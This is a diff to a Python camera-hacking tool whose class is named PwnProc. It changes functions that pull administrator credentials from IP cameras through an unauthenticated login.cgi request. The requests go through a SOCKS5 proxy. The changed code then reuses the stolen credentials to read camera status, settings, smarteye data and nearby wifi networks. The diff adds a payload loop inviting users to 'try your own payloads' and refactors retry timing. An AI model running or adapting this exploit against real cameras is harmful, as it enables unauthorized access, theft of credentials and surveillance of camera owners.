@@ -1053,43 +1053,50 @@ class PwnProc(Process):
 
     def get_creds(self, protocam):
         """Hack Camera credentials
-        Uses an exploit located in /login.cgi: any GET login.cgi returns the administratos credentials
+        Uses an exploit located in /login.cgi: a malformed GET query returns the administratos credentials
         This function parses the result of the query and returns a list creds [user, passwd]
         The connection to the camera is performed through an http proxy"""
 
         try:
-            socks.set_default_proxy(
-                socks.SOCKS5, proxyurl.hostname, proxyurl.port)
-            orig = socket.socket
-            socket.socket = socks.socksocket
-            conn = HTTPConnection(protocam.ip, protocam.port, timeout=15)
-            conn.request("GET", "login.cgi")
-            self.resetHB(1)  # Timed connection
-            c = conn.getresponse()
-            conn.close()
-            self.resetHB(0)
-            socket.socket = orig
-            if c.status == 200:
-                rsp = c.read().decode("utf-8")
-                if pat_result.search(rsp):
-                    if pat_result.search(rsp).group(1) == 'Auth Failed':
-                        return None
-                creds = []
-                for patcred_i in patcredV:
-                    if patcred_i.search(rsp):
-                        creds.append(patcred_i.search(rsp).group(1))
+            for payload in ['login.cgi']:
+                #Try your own payloads :)
+                try:
+                    socks.set_default_proxy(
+                        socks.SOCKS5, proxyurl.hostname, proxyurl.port)
+                    orig = socket.socket
+                    socket.socket = socks.socksocket
+                    conn = HTTPConnection(protocam.ip, protocam.port, timeout=15)
+                    conn.request("GET", payload)
+                    self.resetHB(1)  # Timed connection
+                    c = conn.getresponse()
+                    conn.close()
+                    self.resetHB(0)
+                    socket.socket = orig
+                    if c.status == 200:
+                        rsp = c.read().decode("utf-8")
+                        if pat_result.search(rsp):
+                            if pat_result.search(rsp).group(1) == 'Auth Failed':
+                                return None
+                        creds = []
+                        for patcred_i in patcredV:
+                            if patcred_i.search(rsp):
+                                creds.append(patcred_i.search(rsp).group(1))
+                            else:
+                                creds.append('')
+                        if self.test_creds(protocam, creds) == 200:
+                            return creds
                     else:
-                        creds.append('')
-                if self.test_creds(protocam, creds) == 200:
-                    return creds
-            else:
-                self.myprint(
-                    'Error status code %s requesting login.cgi' % (c.status))
+                        self.myprint(
+                            'Error status code %s requesting %s' % (c.status, payload))
+                except BadStatusLine:
+                    #Apparently this exception may be thrown during the query testing
+                    self.myprint('Host %s:%s responded rubbish' %
+                                 (protocam.ip, protocam.port))
         except UnicodeDecodeError:
             self.myprint('Host %s:%s responded with non UTF-8 format' %
                          (protocam.ip, protocam.port))
-        except (ConnectionResetError, BadStatusLine):
-            self.myprint('Host %s:%s responded rubbish' %
+        except ConnectionResetError:
+            self.myprint('Host %s:%s resetted connection' %
                          (protocam.ip, protocam.port))
         except socket.timeout:
             self.myprint('Host %s:%s didn\'t respond' %
@@ -1105,7 +1112,9 @@ class PwnProc(Process):
         Performs multiple tries in case of network instability
         The number of retries can be tunned if the availability of the camera is not sure"""
 
-        for _ in range(retries):
+        for x in range(retries):
+            if x != 0:
+                sleep(network_sleep)
             try:
                 if creds[0] != '':
                     r = self.timed_get('http://%s:%s/' %
@@ -1115,10 +1124,8 @@ class PwnProc(Process):
                     return 401
             except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                 self.myprint('Unknown HTTP Error')
-                sleep(network_sleep)
             except requests.exceptions.ConnectionError:
                 self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
-                sleep(network_sleep)
         return None
 
     def test_b64(self, protocam):
@@ -1127,7 +1134,9 @@ class PwnProc(Process):
         The connection to the camera is performed using timed_get
         Performs multiple tries in case of network instability"""
 
-        for _ in range(network_retries):
+        for x in range(network_retries):
+            if x != 0:
+                sleep(network_sleep)
             try:
                 r = self.timed_get('http://%s:%s/base64.js' %
                                    (protocam.ip, protocam.port), protocam.creds)
@@ -1140,10 +1149,8 @@ class PwnProc(Process):
                     return None
             except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                 self.myprint('Unknown HTTP Error')
-                sleep(network_sleep)
             except requests.exceptions.ConnectionError:
                 self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
-                sleep(network_sleep)
         return None
 
     def get_status(self, protocam):
@@ -1152,7 +1159,9 @@ class PwnProc(Process):
         The connection to the camera is performed using timed_get
         Performs multiple tries in case of network instability"""
 
-        for _ in range(network_retries):
+        for x in range(network_retries):
+            if x != 0:
+                sleep(network_sleep)
             try:
                 self.timed_get('http://%s:%s/get_status.cgi?loginuse=%s&loginpas=%s' % (protocam.ip,
                                                                                         protocam.port, protocam.creds[0], protocam.creds[1]), protocam.creds)  # Force params reload
@@ -1178,10 +1187,8 @@ class PwnProc(Process):
                     return None
             except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                 self.myprint('Unknown HTTP Error')
-                sleep(network_sleep)
             except requests.exceptions.ConnectionError:
                 self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
-                sleep(network_sleep)
         return None
 
     def get_params(self, protocam):
@@ -1190,7 +1197,9 @@ class PwnProc(Process):
         The connection to the camera is performed using timed_get
         Performs multiple tries in case of network instability"""
 
-        for _ in range(network_retries):
+        for x in range(network_retries):
+            if x != 0:
+                sleep(network_sleep)
             try:
                 mydata = {}
                 for param_i in param_types:
@@ -1216,10 +1225,8 @@ class PwnProc(Process):
                     return mydata
             except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                 self.myprint('Unknown HTTP Error')
-                sleep(network_sleep)
             except requests.exceptions.ConnectionError:
                 self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
-                sleep(network_sleep)
         mydata['wifi'] = {'enable': 0}  # Maybe not the best idea
         return mydata
 
@@ -1229,7 +1236,9 @@ class PwnProc(Process):
         The connection to the camera is performed using timed_get
         Performs multiple tries in case of network instability"""
 
-        for _ in range(network_retries):
+        for x in range(network_retries):
+            if x != 0:
+                sleep(network_sleep)
             try:
                 smartdata = {}
                 r = self.timed_get('http://%s:%s/get_smarteye.cgi?loginuse=%s&loginpas=%s' % (
@@ -1245,10 +1254,8 @@ class PwnProc(Process):
                     return smartdata
             except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                 self.myprint('Unknown HTTP Error')
-                sleep(network_sleep)
             except requests.exceptions.ConnectionError:
                 self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
-                sleep(network_sleep)
         return smartdata
 
     def get_wifi_scan(self, protocam):
@@ -1258,7 +1265,9 @@ class PwnProc(Process):
         The connection to the camera is performed using timed_get
         Performs multiple tries in case of network instability"""
 
-        for _ in range(network_retries):
+        for x in range(network_retries):
+            if x != 0:
+                sleep(network_sleep)
             try:
                 mylist = []
                 i = 0
@@ -1301,10 +1310,8 @@ class PwnProc(Process):
                 return mylist
             except (requests.exceptions.HTTPError, requests.exceptions.ReadTimeout, UnicodeEncodeError):
                 self.myprint('Unknown HTTP Error')
-                sleep(network_sleep)
             except requests.exceptions.ConnectionError:
                 self.myprint('Host %s:%s Down' % (protocam.ip, protocam.port))
-                sleep(network_sleep)
         return []
 
     def timed_get(self, url, creds, **kwargs):
